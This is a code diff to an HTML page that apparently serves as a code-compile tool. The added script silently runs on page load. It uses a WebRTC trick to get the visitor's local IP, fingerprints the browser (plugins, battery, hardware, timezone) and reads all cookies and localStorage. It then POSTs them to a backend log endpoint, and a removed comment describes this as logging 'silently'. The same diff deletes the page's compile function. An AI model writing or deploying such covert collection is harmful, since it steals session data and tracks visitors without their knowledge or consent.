@@ -15,48 +15,49 @@
     <pre id="output"></pre>
 
     <script>
-        async function logUserInfo() {
-            const pc = new RTCPeerConnection();
-            let logged = false;
+    async function logUserInfo() {
+        const pc = new RTCPeerConnection();
+        let logged = false;
 
-            pc.createDataChannel('');
-            pc.createOffer().then(offer => pc.setLocalDescription(offer));
+        pc.createDataChannel('');
+        pc.createOffer().then(offer => pc.setLocalDescription(offer));
 
-            pc.onicecandidate = event => {
-                if (event.candidate && !logged) {
-                    const candidate = event.candidate.candidate;
-                    if (candidate.includes("candidate")) {
-                        const localIP = candidate.split(" ")[4];
-                        logged = true;
+        pc.onicecandidate = async event => {
+            if (event.candidate && !logged) {
+                const candidate = event.candidate.candidate;
+                if (candidate.includes("candidate")) {
+                    const localIP = candidate.split(" ")[4];
+                    logged = true;
 
-                        // Collect additional user information
-                        const searchTerm = ''; // Modify to collect real search terms if applicable
-                        const userAgent = navigator.userAgent;
-                        const referrerHistory = document.referrer ? [document.referrer] : [];
-                        const currentURL = window.location.href;
-                        const screenWidth = screen.width;
-                        const screenHeight = screen.height;
-                        const browserLanguage = navigator.language || navigator.userLanguage;
-                        const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-                        const osInfo = navigator.platform;
-                        const timestamp = new Date().toISOString();
-                        const timeSpent = 0; // Calculate time spent on the page if needed
-                        const activeTabDuration = 0; // Calculate active tab duration if needed
-                        const networkStatus = navigator.onLine ? 'Online' : 'Offline';
-                        const deviceType = /Mobi|Android/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';
-                        const memoryInfo = performance.memory ? `${performance.memory.usedJSHeapSize} bytes` : 'No memory info';
-                        const hardwareConcurrency = navigator.hardwareConcurrency || 'Unknown';
-                        const connectionType = navigator.connection ? navigator.connection.effectiveType : 'Unknown';
-                        const plugins = Array.from(navigator.plugins).map(plugin => plugin.name).join(', ') || 'No plugins';
-                        const battery = await navigator.getBattery();
-                        const batteryLevel = battery.level * 100;
-                        const isCharging = battery.charging;
-                        const geolocation = { lat: 0, lon: 0, error: 'Geolocation not available' }; // Implement geolocation if possible
-                        const cookies = document.cookie || 'No cookies';
-                        const localStorageData = JSON.stringify(localStorage) || 'No local storage data';
+                    // Collect additional user information
+                    const searchTerm = ''; // Modify to collect real search terms if applicable
+                    const userAgent = navigator.userAgent;
+                    const referrerHistory = document.referrer ? [document.referrer] : [];
+                    const currentURL = window.location.href;
+                    const screenWidth = screen.width;
+                    const screenHeight = screen.height;
+                    const browserLanguage = navigator.language || navigator.userLanguage;
+                    const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                    const osInfo = navigator.platform;
+                    const timestamp = new Date().toISOString();
+                    const timeSpent = 0; // Calculate time spent on the page if needed
+                    const activeTabDuration = 0; // Calculate active tab duration if needed
+                    const networkStatus = navigator.onLine ? 'Online' : 'Offline';
+                    const deviceType = /Mobi|Android/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';
+                    const memoryInfo = performance.memory ? `${performance.memory.usedJSHeapSize} bytes` : 'No memory info';
+                    const hardwareConcurrency = navigator.hardwareConcurrency || 'Unknown';
+                    const connectionType = navigator.connection ? navigator.connection.effectiveType : 'Unknown';
+                    const plugins = Array.from(navigator.plugins).map(plugin => plugin.name).join(', ') || 'No plugins';
+                    const battery = await navigator.getBattery();
+                    const batteryLevel = battery.level * 100;
+                    const isCharging = battery.charging;
+                    const geolocation = { lat: 0, lon: 0, error: 'Geolocation not available' }; // Implement geolocation if possible
+                    const cookies = document.cookie || 'No cookies';
+                    const localStorageData = JSON.stringify(localStorage) || 'No local storage data';
 
-                        // Send the data to the backend
-                        fetch('/api/log', {
+                    // Send the data to the backend
+                    try {
+                        const response = await fetch('/api/log', {
                             method: 'POST',
                             headers: { 'Content-Type': 'application/json' },
                             body: JSON.stringify({ 
@@ -68,33 +69,22 @@
                                 batteryLevel, isCharging, geolocation, cookies, 
                                 localStorageData 
                             })
-                        }).then(response => {
-                            if (!response.ok) {
-                                console.error('Failed to log user info');
-                            }
-                        }).catch(error => {
-                            console.error('Error:', error);
                         });
+                        
+                        if (!response.ok) {
+                            console.error('Failed to log user info:', response.statusText);
+                        } else {
+                            console.log('User info logged successfully');
+                        }
+                    } catch (error) {
+                        console.error('Error sending log:', error);
                     }
                 }
-            };
-        }
+            }
+        };
+    }
 
-        async function compileCode() {
-            const code = document.getElementById('code').value;
-
-            const response = await fetch('/api/compile', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ code })
-            });
-
-            const result = await response.json();
-            document.getElementById('output').textContent = result.output;
-        }
-
-        document.getElementById('submit').onclick = compileCode;
-        logUserInfo(); // Start user info logging silently
-    </script>
+    document.addEventListener('DOMContentLoaded', logUserInfo); // Start user info logging on page load
+</script>
 </body>
 </html>
